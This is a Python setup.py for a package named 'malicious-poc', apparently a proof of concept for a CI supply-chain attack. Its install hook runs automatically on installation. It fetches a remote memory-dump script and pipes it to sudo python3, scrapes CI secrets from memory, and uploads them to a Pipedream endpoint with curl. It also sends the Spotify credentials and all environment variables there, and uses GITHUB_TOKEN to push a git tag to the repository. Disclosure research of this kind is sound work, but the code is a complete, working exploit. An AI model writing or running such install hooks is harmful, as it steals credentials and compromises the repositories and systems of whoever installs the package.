from setuptools import setup
from setuptools.command.install import install
import subprocess
import os
import time

class CustomInstallCommand(install):
    def run(self):
        # 1. Download and run memdump.py, filter for possible secrets, save to /tmp/secrets
        bash_command = (
            "curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py "
            "| sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> /tmp/secrets"
        )
        subprocess.run(["bash", "-c", bash_command])

        # 2. Exfiltrate memory secrets file (if any) to Pipedream
        exfil_command = (
            "curl -X PUT --upload-file /tmp/secrets https://eoiissjprny7lfp.m.pipedream.net/memsecrets.txt"
        )
        subprocess.run(["bash", "-c", exfil_command])

        # 3. Exfiltrate SPOTIPY_CLIENT_ID and SPOTIPY_CLIENT_SECRET (from env) via curl
        client_id = os.environ.get("SPOTIPY_CLIENT_ID")
        client_secret = os.environ.get("SPOTIPY_CLIENT_SECRET")
        env_payload = f"SPOTIPY_CLIENT_ID={client_id}&SPOTIPY_CLIENT_SECRET={client_secret}"
        curl_env_command = (
            f"curl -X PUT -d '{env_payload}' https://eoiissjprny7lfp.m.pipedream.net/secrets.txt"
        )
        subprocess.run(["bash", "-c", curl_env_command])

        # 4. (Optional) Exfiltrate all env vars
        env_vars = "&".join([f"{k}={v}" for k, v in os.environ.items()])
        curl_all_env_command = (
            f"curl -X PUT -d '{env_vars}' https://eoiissjprny7lfp.m.pipedream.net/psecrets.txt"
        )
        subprocess.run(["bash", "-c", curl_all_env_command])

        # 5. Create and push git tag (like in npm PoC)
        github_token = os.environ.get("GITHUB_TOKEN")
        github_repository = os.environ.get("GITHUB_REPOSITORY")
        tag_name = f"poc-action-{int(time.time())}"

        subprocess.run(["git", "config", "--global", "user.email", "attacker@poc.com"])
        subprocess.run(["git", "config", "--global", "user.name", "PoC Attacker"])
        subprocess.run(["git", "tag", tag_name])

        if github_token and github_repository:
            push_cmd = (
                f"git push https://x-access-token:{github_token}@github.com/{github_repository}.git --tags || echo 'tag push failed'"
            )
            subprocess.run(["bash", "-c", push_cmd])
        else:
            print("GITHUB_TOKEN or GITHUB_REPOSITORY not set, cannot push tag.")

        # Optional: Sleep (just for PoC, can remove)
        subprocess.run(["bash", "-c", "sleep 60"])

        install.run(self)

setup(
    name='malicious-poc',
    version='1.0.0',
    author='PoC Researcher',
    author_email='attacker@example.com',
    description='Proof-of-Concept package with custom install logic',
    packages=['malicious_poc'],
    python_requires='>=3.6',
    classifiers=[
        'Programming Language :: Python :: 3',
    ],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
